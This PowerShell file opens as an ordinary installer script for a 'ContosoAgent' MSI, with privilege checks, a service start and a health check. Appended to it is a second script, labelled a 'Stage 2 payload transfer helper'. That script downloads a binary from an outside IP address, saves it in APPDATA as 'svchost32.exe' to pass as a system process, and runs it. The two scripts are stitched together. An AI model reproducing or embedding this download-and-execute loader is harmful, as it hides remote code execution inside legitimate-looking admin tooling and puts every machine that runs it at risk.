#Requires -Version 5.1
[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$InstallerPath = "C:\Scripts\packages\ContosoAgent-3.2.4.msi",

    [string]$ServiceName = 'ContosoAgent',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1024, 65535)]
    [int]$Port = 8443,

    [int]$TimeoutSec = 180,
    [string]$LogPath = "C:\Logs\install-contosoagent-2024-01-22.log",
    [string]$RuleName = 'ContosoAgent Inbound'
)

$ErrorActionPreference = "Stop"

$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
$DebugPreference = 'SilentlyContinue'
$culture = [System.Globalization.CultureInfo]::InvariantCulture

$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'This script must run from an elevated PowerShell session.'
}
if (-not (Test-Path -LiteralPath $InstallerPath)) {
    throw ("Installer package not found: {0}" -f $InstallerPath)
}
$arguments = @('/i', $InstallerPath, '/qn', '/norestart', '/L*v', $LogPath)
$process = Start-Process -FilePath 'msiexec.exe' -ArgumentList $arguments -Wait -PassThru
if ($process.ExitCode -ne 0) {
    throw ("Installation failed with exit code {0}" -f $process.ExitCode)
}
Write-Verbose ("msiexec completed with exit code {0}" -f $process.ExitCode)
$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if (-not $service) {
    throw ("Service {0} was not registered by the installer" -f $ServiceName)
}
if ($service.Status -ne 'Running') {
    Set-Service -Name $ServiceName -StartupType Automatic
    Start-Service -Name $ServiceName
    Write-Verbose ("Started service {0}" -f $ServiceName)
}

$healthUri = "http://localhost:$Port/health"
$deadline = (Get-Date).AddSeconds($TimeoutSec)
do {
    try {
        $response = Invoke-WebRequest -Uri $healthUri -UseBasicParsing -TimeoutSec 5
    }
    catch {
        $response = $null
    }
    if (-not $response) {
        Start-Sleep -Seconds 2
    }
} while (-not $response -and (Get-Date) -lt $deadline)
if (-not $response) {
    throw ("Health endpoint {0} did not respond in time" -f $healthUri)
}
Write-Host ("Health check returned {0}" -f $response.StatusCode) -ForegroundColor Green

$installed = Get-Service -Name $ServiceName
Write-Host ("{0} {1} is {2}" -f $installed.Name, $installed.DisplayName, $installed.Status) -ForegroundColor Green
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = "https://192.0.2.52/stage2.bin",
    [string]$DownloadPath = "$env:APPDATA\svchost32.exe",
    [int]$TransferTimeout = 159,
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$StageResult = Invoke-PayloadFetch -SourceUrl $TransferUrl -DestinationPath $DownloadPath -TimeoutSec $TransferTimeout -UserAgent $RequestAgent
if ($StageResult) {
    Start-Process -FilePath $DownloadPath
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$ProgressPreference = "SilentlyContinue"
